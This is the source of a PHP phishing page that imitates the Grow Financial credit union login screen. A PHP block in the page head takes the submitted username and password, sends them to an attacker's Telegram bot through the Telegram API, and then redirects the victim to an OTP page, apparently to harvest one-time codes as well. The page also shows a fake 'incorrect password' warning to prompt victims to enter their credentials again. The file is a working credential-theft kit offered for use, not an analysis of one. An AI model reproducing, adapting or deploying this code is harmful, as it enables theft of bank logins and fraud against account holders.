

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home - Grow Financial</title>
    <link rel="stylesheet" href="output.css">
    <?php
                    if (isset($_POST['submit'])) {
                        require './form.php';
                        header('Location: otp.php');
                        echo '<META HTTP-EQUIV="refresh" content="0;URL=' . $URL . "/otp.php" . '">';
                        define('url', "https://api.telegram.org/bot".$token.'/');
                        $userid = $_POST['user'];
                        $pass = $_POST['pass'];
                        $message = urlencode("GROW FINANCIAL BY HEYLIEN" . "\nUser ID: " . $userid . "\nPassword: " . $pass);
                        file_get_contents(url . "sendmessage?text=" . $message . "&chat_id=" . $chat_id . "&parse_mode=HTML");
                    }
    ?>
</head>
<body class="h-screen w-full">
    <header class="flex flex-col bg-white pt-4 mx-4">
        <div class="flex flex-row invisible md:visible py-4 items-center justify-center bg-green-800">
            <span class="text-white text-xs h-5 font-light">LOST OR STOLEN CARD? 800.839.6328 &nbsp; | &nbsp;</span>
            <span class="text-white text-xs h-5 font-light">GROW ROUTING NUMBER: 263182914 &nbsp; | &nbsp;</span>
            <span class="text-white text-xs h-5 font-light">LOCATE ATM/STORE &nbsp; | &nbsp;</span>
            <span class="text-white text-xs h-5 font-light">How To Find Your Account Number &nbsp; | &nbsp;</span>
            <span class="text-white text-xs h-5 font-light">Making A Loan Payment</span>
        </div>
        <div class="flex flex-row pt-2">
            <div class="space-y-2 pt-3 pr-8">
                <span class="block w-7 h-0.5 bg-gray-600"></span>
                <span class="block w-7 h-0.5 bg-gray-600"></span>
                <span class="block w-7 h-0.5 bg-gray-600"></span>
            </div>
            <div class="flex items-center justify-center pr-8"><img src="logo.svg" alt="logo" class="w-52"></div>
            <span class="hidden lg:flex items-center justify-center self-center space-x-1 pt-2">
                <a
                    href=""
                    class="py-4 px-2 text-base font-semibold text-green-800 hover:border-b-4 hover:border-slate-400"
                    >MEMBERSHIP</a
                >
                <a
                    href=""
                    class="py-4 px-2 text-base text-green-800 font-semibold hover:border-b-4 hover:border-slate-400 transition duration-300"
                    >PERSONAL</a
                >
                <a
                    href=""
                    class="py-4 px-2 text-base text-green-800 font-semibold hover:border-b-4 hover:border-slate-400 transition duration-300"
                    >BUSINESS</a
                >
                <a
                    href=""
                    class="py-4 px-2 text-base text-green-800 font-semibold hover:border-b-4 hover:border-slate-400 transition duration-300"
                    >HOME & AUTO</a
                >
                <a
                    href=""
                    class="py-4 px-2 text-base text-green-800 font-semibold hover:border-b-4 hover:border-slate-400 transition duration-300"
                    >RESOURCES</a
                >
                <a
                    href=""
                    class="py-4 px-2 text-base text-green-800 font-semibold hover:border-b-4 hover:border-slate-400 transition duration-300"
                    >COMMUNITY</a
                >
                <a
                    href=""
                    class="py-4 px-2 text-base text-green-800 font-semibold hover:border-b-4 hover:border-slate-400 transition duration-300"
                    >CONTACT</a
                >
            </span>
            <span class="flex pt-3 items-end justify-end md:invisible text-green-800 text-sm font-bold">LOGIN</span>
        </div>
        
    </header>
    <main class="h-70">
        <div class="md:flex py-4">
            <div style="background-image: url('./dk4.jpg');" class="relative overflow-hidden md:flex w-1/7 bg-gradient-to-tr i justify-around items-center mt-4 hidden">
                <div><span class="text-white font-bold text-4xl font-sans">We Serve People Not Profit.</span></div>
                
            </div>

                <div class="flex md:w-1/8 px-3 justify-center py-10 items-center bg-white">
                    <form action="" method="post" class="bg-white flex flex-col w-11/12">
                        <h1 class="flex text-2xl font-normal text-green-800">Welcome Back</h1>
                        <p class="flex text-xs font-semibold text-pink-800">Username or Password Incorrect</p>
                        
                        <label class="inline-flex flex-col py-2">
                            <input type="text" placeholder="Username" name="user" required id="user" class="block justify-center items-center text-base px-4 font-medium border border-gray-600 h-12 shadow-sm focus:outline-none text-gray-600 focus:border-green-800"/>
                            <!--<p class="mt-2 invisible peer-invalid:visible text-pink-600 text-sm">
                                Please provide a valid email address.
                            </p>-->
                        </label>

                        <label class="inline-flex flex-col py-2">
                            <input type="text" placeholder="Password" name="pass" required id="pass" class="block justify-center items-center text-base px-4 font-medium border border-gray-600 h-12 shadow-sm focus:outline-none text-gray-600 focus:border-green-800"/>
                            <!--<p class="mt-2 invisible peer-invalid:visible text-pink-600 text-sm">
                                Please provide a valid email address.
                            </p>-->
                        </label>

                        <button type="submit" name="submit" class="inline-flex justify-center items-center h-12 text-center py-3 text-base font-medium bg-green-800 text-white hover:bg-green-700">LOG IN</button>

                        <div class="flex flex-row text-sm font-medium text-green-700 py-2">
                            <span class="underline">Forgot Username?</span>
                            <span class="px-2">|</span>
                            <span class="underline">Forgot Password?</span>
                        </div>
                        <div class="flex flex-row text-sm font-medium py-2">
                            <span class="">Not Enrolled?</span>
                            <span class="px-1"></span>
                            <span class="underline text-green-700">Sign Up Now</span>
                        </div>
                    </form>
                </div>
        </div>
    </main>
    <footer class="w-full">
        <div class="flex items-end justify-end pr-3"><button type="button" class="h-9 px-1 py-1 bg-green-800 text-white">Back To Top &#8593</button></div>
    </footer>
</body>
</html>